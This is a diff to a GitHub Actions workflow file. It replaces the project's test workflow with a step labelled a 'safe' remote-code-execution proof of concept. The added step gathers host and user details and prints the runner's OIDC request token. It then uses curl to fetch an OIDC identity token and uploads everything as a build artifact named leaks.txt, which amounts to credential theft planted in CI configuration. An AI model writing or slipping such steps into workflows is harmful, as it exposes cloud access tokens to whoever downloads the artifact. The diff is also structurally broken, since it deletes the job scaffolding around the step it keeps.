@@ -1,50 +1,32 @@
-name: Tests
-
-on:
-  pull_request:
-    paths-ignore:
-      - ".github/workflows/migration-tests.yml"
-      - ".github/dependabot.yml"
-      - ".github/labeler.yml"
-      - "migrations/**"
-  push:
-    branches:
-      - main
-      - beta
-      - stable
-    paths-ignore:
-      - ".github/workflows/migration-tests.yml"
-      - ".github/dependabot.yml"
-      - ".github/labeler.yml"
-      - "migrations/**"
-
-permissions:
-  contents: read
-
-jobs:
-  build:
-    name: Safe CI RCE PoC
-    runs-on: ubuntu-latest
-    steps:
-      - name: Checkout Repository
-        uses: actions/checkout@v4
-
-      - name: Run Safe RCE Simulation
+- name: Leak PoC Artifact
         run: |
           echo "SAFE_CI_PROOF [+] Executing payload..." > leaks.txt
+
           echo "== WHOAMI ==" >> leaks.txt
           whoami >> leaks.txt
+
           echo "== ID ==" >> leaks.txt
           id >> leaks.txt
+
           echo "== UNAME ==" >> leaks.txt
           uname -a >> leaks.txt
+
           echo "== OS RELEASE ==" >> leaks.txt
           cat /etc/os-release >> leaks.txt
+
           echo "== ENV VARS (SAFE) ==" >> leaks.txt
-          env | grep -E '^(HOME|USER|PATH|LANG)' >> leaks.txt
+          env | grep -E '^(HOME|LANG|USER|PATH)' >> leaks.txt
+
+          echo "== OIDC ENV ==" >> leaks.txt
+          echo "$ACTIONS_ID_TOKEN_REQUEST_URL" >> leaks.txt
+          echo "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" >> leaks.txt
+
+          echo "== OIDC CURL ==" >> leaks.txt
+          curl -sSL -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "$ACTIONS_ID_TOKEN_REQUEST_URL?audience=api://default" >> leaks.txt
 
       - name: Upload Leak Artifact
         uses: actions/upload-artifact@v4
         with:
-          name: safe-ci-leak-proof
+          name: leaks.txt
           path: leaks.txt
